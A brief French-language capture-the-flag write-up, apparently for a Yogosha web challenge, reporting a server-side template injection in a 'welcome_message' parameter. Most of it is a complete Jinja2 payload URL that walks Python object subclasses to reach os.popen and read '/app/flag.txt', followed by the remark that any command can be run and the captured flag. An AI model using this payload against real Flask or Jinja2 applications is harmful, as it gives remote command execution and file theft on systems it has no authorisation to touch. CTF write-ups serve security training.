Il y une SSTI au niveau du paramêtre welcome_message :

```
https://web5.ctf.yogosha.com/?welcome_message={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20%22warning%22%20in%20x.__name__%20%}{{x()._module.__builtins__[%27__import__%27](%27os%27).popen(%22cat%20/app/flag.txt%22).read()}}{%endif%}{%%20endfor%20%}
```

on peu donc executer toute les commandes souhaité.

Hello, StarHack{SSTI?NOOOOOOOOOOOO} !